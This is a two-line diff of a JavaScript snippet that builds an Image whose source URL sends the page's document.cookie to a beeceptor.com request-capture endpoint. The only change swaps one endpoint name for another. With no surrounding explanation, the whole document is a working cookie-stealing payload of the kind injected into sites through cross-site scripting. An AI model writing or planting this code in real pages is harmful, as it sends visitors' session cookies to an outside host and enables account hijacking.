@@ -1,2 +1,2 @@
 const img = new Image();
-img.src = 'https://myendpoint.free.beeceptor.com/?cookie=' + document.cookie;
+img.src = 'https://coolendpoint.free.beeceptor.com/?cookie=' + document.cookie;
